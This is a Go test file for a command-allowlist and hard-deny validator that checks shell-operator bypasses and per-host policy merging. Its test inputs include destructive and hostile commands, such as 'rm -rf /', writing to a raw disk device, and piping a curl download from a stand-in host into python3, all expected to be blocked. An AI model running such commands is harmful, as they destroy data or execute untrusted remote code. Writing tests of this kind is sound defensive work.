package policy

import (
	"sync"
	"testing"
)

// TestAllowlistSegmentBypass ensures that shell operators cannot bypass
// allowlist validation by piping, chaining, or substituting commands.
func TestAllowlistSegmentBypass(t *testing.T) {
	tests := []struct {
		name    string
		hp      HostPolicy
		cmd     string
		allowed bool
	}{
		// allowlist with shell operators enabled: each segment must be allowed
		{
			name: "uptime allowed alone",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "uptime"}},
				AllowShellOperators: true,
			},
			cmd:     "uptime",
			allowed: true,
		},
		{
			name: "uptime with semicolon",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "uptime"}},
				AllowShellOperators: true,
			},
			cmd:     "uptime; rm -rf ~",
			allowed: false,
		},
		{
			name: "uptime with and operator",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "uptime"}},
				AllowShellOperators: true,
			},
			cmd:     "uptime && id",
			allowed: false,
		},
		{
			name: "uptime with pipe",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "uptime"}},
				AllowShellOperators: true,
			},
			cmd:     "uptime | grep x",
			allowed: false,
		},
		{
			name: "uptime with newline",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "uptime"}},
				AllowShellOperators: true,
			},
			cmd:     "uptime\nid",
			allowed: false,
		},
		{
			name: "ls with command substitution dollar paren",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "ls"}},
				AllowShellOperators: true,
			},
			cmd:     "ls $(whoami)",
			allowed: false,
		},
		{
			name: "ls with command substitution backtick",
			hp: HostPolicy{
				AllowedCommands:     []CommandRule{{Command: "ls"}},
				AllowShellOperators: true,
			},
			cmd:     "ls `id`",
			allowed: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Compile rules if needed
			for i := range tt.hp.AllowedCommands {
				if err := tt.hp.AllowedCommands[i].Compile(); err != nil {
					t.Fatalf("failed to compile rule: %v", err)
				}
			}

			result := ValidateCommand(tt.cmd, tt.hp, ModeAllowlist)
			if result.Allowed != tt.allowed {
				t.Errorf("ValidateCommand(%q) allowed=%v want=%v (reason: %s)",
					tt.cmd, result.Allowed, tt.allowed, result.Reason)
			}
		})
	}
}

// TestHardDenyCoverage verifies that dangerous patterns are blocked
// regardless of policy mode or settings, and case-insensitivity is respected.
func TestHardDenyCoverage(t *testing.T) {
	// permissive policy that would allow everything if not for hard deny
	hp := HostPolicy{
		AllowedCommands: []CommandRule{
			{Pattern: ".*"},
		},
		AllowShellOperators: true,
	}
	for i := range hp.AllowedCommands {
		if err := hp.AllowedCommands[i].Compile(); err != nil {
			t.Fatalf("failed to compile rule: %v", err)
		}
	}

	tests := []struct {
		name  string
		cmd   string
		allow bool
	}{
		// case-insensitive dangerous patterns
		{
			name:  "CHMOD 777 uppercase",
			cmd:   "CHMOD 777 /tmp/x",
			allow: false,
		},
		{
			name:  "rm -rf root",
			cmd:   "rm -rf /",
			allow: false,
		},
		{
			name:  "rm -fr root",
			cmd:   "rm -fr /",
			allow: false,
		},
		{
			name:  "write to nvme device",
			cmd:   "cat data > /dev/nvme0n1",
			allow: false,
		},
		{
			name:  "curl pipe python shell",
			cmd:   "curl http://x.example.com/s | python3",
			allow: false,
		},
		{
			name:  "chmod world writable",
			cmd:   "chmod o+w /etc/hosts",
			allow: false,
		},
		{
			name:  "benign uptime command",
			cmd:   "uptime",
			allow: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ValidateCommand(tt.cmd, hp, ModeGuardrail)
			if result.Allowed != tt.allow {
				t.Errorf("ValidateCommand(%q) allowed=%v want=%v (reason: %s)",
					tt.cmd, result.Allowed, tt.allow, result.Reason)
			}
		})
	}
}

// TestResolvedPolicyNoBleed ensures that calling ResolvedPolicy multiple times
// on the same Policy does not cause mutations to defaults, and that host-specific
// rules do not leak into other hosts' resolved policies.
func TestResolvedPolicyNoBleed(t *testing.T) {
	p := &Policy{
		Defaults: HostPolicy{
			AllowedCommands: []CommandRule{
				{Command: "base"},
			},
			SSHOptions: map[string]string{"X": "1"},
		},
		Hosts: map[string]HostPolicy{
			"a": {
				AllowedCommands: []CommandRule{
					{Command: "a"},
				},
				SSHOptions: map[string]string{"Y": "2"},
			},
			"b": {
				AllowedCommands: []CommandRule{
					{Command: "b"},
				},
			},
		},
	}

	// Compile all rules
	for i := range p.Defaults.AllowedCommands {
		if err := p.Defaults.AllowedCommands[i].Compile(); err != nil {
			t.Fatalf("failed to compile default rule: %v", err)
		}
	}
	for host, hp := range p.Hosts {
		for i := range hp.AllowedCommands {
			if err := hp.AllowedCommands[i].Compile(); err != nil {
				t.Fatalf("failed to compile rule for host %s: %v", host, err)
			}
		}
		p.Hosts[host] = hp
	}

	// Resolve host "a"
	ra := p.ResolvedPolicy("a")
	if len(ra.AllowedCommands) != 2 {
		t.Errorf("host a: expected 2 allowed commands (base + a), got %d", len(ra.AllowedCommands))
	}
	if ra.AllowedCommands[0].Command != "base" || ra.AllowedCommands[1].Command != "a" {
		t.Errorf("host a: commands should be [base, a], got [%s, %s]",
			ra.AllowedCommands[0].Command, ra.AllowedCommands[1].Command)
	}

	// Resolve host "b"
	rb := p.ResolvedPolicy("b")
	if len(rb.AllowedCommands) != 2 {
		t.Errorf("host b: expected 2 allowed commands (base + b), got %d", len(rb.AllowedCommands))
	}
	if rb.AllowedCommands[0].Command != "base" || rb.AllowedCommands[1].Command != "b" {
		t.Errorf("host b: commands should be [base, b], got [%s, %s]",
			rb.AllowedCommands[0].Command, rb.AllowedCommands[1].Command)
	}

	// Resolve "a" again; should still have 2 (no accumulation)
	ra2 := p.ResolvedPolicy("a")
	if len(ra2.AllowedCommands) != 2 {
		t.Errorf("host a (second resolve): expected 2, got %d", len(ra2.AllowedCommands))
	}

	// Verify defaults were never mutated
	if len(p.Defaults.AllowedCommands) != 1 {
		t.Errorf("defaults: expected 1 command, got %d (was mutated)", len(p.Defaults.AllowedCommands))
	}
	if len(p.Defaults.SSHOptions) != 1 || p.Defaults.SSHOptions["X"] != "1" {
		t.Errorf("defaults SSHOptions mutated: expected {X:1}, got %v", p.Defaults.SSHOptions)
	}

	// Verify SSH options merged correctly for host a (X from defaults, Y from host)
	if len(ra.SSHOptions) != 2 {
		t.Errorf("host a: expected 2 SSH options, got %d", len(ra.SSHOptions))
	}
	if ra.SSHOptions["X"] != "1" || ra.SSHOptions["Y"] != "2" {
		t.Errorf("host a SSHOptions: expected {X:1, Y:2}, got %v", ra.SSHOptions)
	}

	// Verify host b still has defaults only (no Y)
	if len(rb.SSHOptions) != 1 || rb.SSHOptions["X"] != "1" {
		t.Errorf("host b SSHOptions: expected {X:1}, got %v", rb.SSHOptions)
	}
}

// TestResolvedPolicyConcurrent verifies that ResolvedPolicy is safe to call
// concurrently from many goroutines without race conditions or data corruption.
func TestResolvedPolicyConcurrent(t *testing.T) {
	p := &Policy{
		Defaults: HostPolicy{
			AllowedCommands: []CommandRule{
				{Command: "default"},
			},
		},
		Hosts: map[string]HostPolicy{
			"a": {
				AllowedCommands: []CommandRule{
					{Command: "host-a"},
				},
			},
			"b": {
				AllowedCommands: []CommandRule{
					{Command: "host-b"},
				},
			},
		},
	}

	// Compile rules
	for i := range p.Defaults.AllowedCommands {
		if err := p.Defaults.AllowedCommands[i].Compile(); err != nil {
			t.Fatalf("failed to compile: %v", err)
		}
	}
	for host, hp := range p.Hosts {
		for i := range hp.AllowedCommands {
			if err := hp.AllowedCommands[i].Compile(); err != nil {
				t.Fatalf("failed to compile: %v", err)
			}
		}
		p.Hosts[host] = hp
	}

	const numGoroutines = 50
	var wg sync.WaitGroup
	errCh := make(chan error, numGoroutines)

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			// alternate between hosts a and b
			host := "a"
			if idx%2 == 1 {
				host = "b"
			}
			resolved := p.ResolvedPolicy(host)
			// each should have default + host-specific = 2 rules
			if len(resolved.AllowedCommands) != 2 {
				errCh <- errorf("goroutine %d: host %s has %d commands, expected 2",
					idx, host, len(resolved.AllowedCommands))
			}
		}(i)
	}

	wg.Wait()
	close(errCh)

	for err := range errCh {
		t.Error(err)
	}
}

// errorf is a helper to create a simple error for concurrent tests.
func errorf(format string, args ...interface{}) error {
	return &testError{msg: format}
}

type testError struct {
	msg string
}

func (e *testError) Error() string {
	return e.msg
}
